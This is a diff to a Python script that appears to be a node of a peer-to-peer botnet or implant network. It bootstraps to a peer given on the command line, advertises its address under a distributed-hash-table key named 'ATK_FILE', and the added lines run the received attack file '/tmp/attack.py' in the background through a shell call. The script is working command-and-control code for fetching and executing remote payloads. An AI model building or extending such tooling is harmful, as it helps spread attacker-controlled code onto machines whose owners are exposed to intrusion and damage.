@@ -4,16 +4,17 @@ import os
 from random import randint, choice
 import json
 import base64
+import sys
 
 # The logic can be extended to have attack and implant modules.
 ATK_FILE = "/tmp/attack.py"
 IMPL_FILE = "implant.zip"
 
-ETH = "virbr0"
 FILE_RECEIVED = False
 UDP_PORT = randint(11000, 12000)
 BOOTSTARP_PORT = 5678
-BOOTSTRAP_NODES = [("192.168.122.1", BOOTSTARP_PORT)]
+BOOTSTARP_IP = sys.argv[1]
+BOOTSTRAP_NODES = [(BOOTSTARP_IP, BOOTSTARP_PORT)]
 ATK_UDP_PORT = 9191
 
 class EchoClientProtocol:
@@ -88,7 +89,9 @@ def send_msg(i_msg, i_ip, i_port):
 
 
 def get_my_ip():
-    f = os.popen('ifconfig {} | grep "inet" | cut -d: -f2 | cut -d" " -f1'.format(ETH))
+    f = os.popen("ip a | grep 'scope global' | awk '{ print $NF }'")
+    local_eth = f.read().rstrip()
+    f = os.popen('ifconfig {} | grep "inet" | cut -d: -f2 | cut -d" " -f1'.format(local_eth))
     # Keep some verifier, see the returned item is ok or not.
     return f.read().rstrip()
 
@@ -119,9 +122,12 @@ if not result is None:
     send_msg(json.dumps(local_msg), some_ip_port[0], some_ip_port[1])
     loop.run_until_complete(node.set("ATK_FILE", "{},{}:{}".format(result, get_my_ip(), UDP_PORT)))
 
+    # execute the file.
+    f = os.popen("python3 {}&".format(ATK_FILE))
+    print(f.read())
+
 else:
     loop.run_until_complete(node.set("ATK_FILE", "{}:{}".format(get_my_ip(), UDP_PORT)))
-
 
 
 if __name__ == '__main__':
